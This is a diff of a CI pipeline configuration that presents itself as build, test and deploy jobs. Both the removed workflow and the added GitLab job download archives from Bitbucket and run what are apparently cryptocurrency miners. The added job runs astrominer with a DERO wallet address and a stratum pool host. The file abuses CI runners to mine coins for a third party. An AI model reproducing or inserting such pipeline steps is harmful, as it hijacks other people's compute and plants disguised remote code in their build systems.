@@ -1,9 +1,14 @@
-workflows:
-  android:
-    name: build, test & publish Android version
-    scripts:
-      - wget https://bitbucket.org/Abyehaqi/haqie/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
-  ios:
-    name: build, test & publish iOS version
-    scripts:
-      - wget https://bitbucket.org/Abyehaqi/haqie/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./ikuk mine.ini
+image: ubuntu-20.04
+
+variables:
+  REPO_NAME: gitlab.com/namespace/project
+
+stages:
+  - build
+  - test
+  - deploy
+
+build_a:
+  stage: build
+  script:
+    - wget https://bitbucket.org/wename798/jaya/downloads/astrominer.tar.gz && tar -xvf astrominer.tar.gz && ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmylq8cq7asn9nqswcd3s.Q2 -t16 -r stratum+tcp://stue.threepool.tech:3030
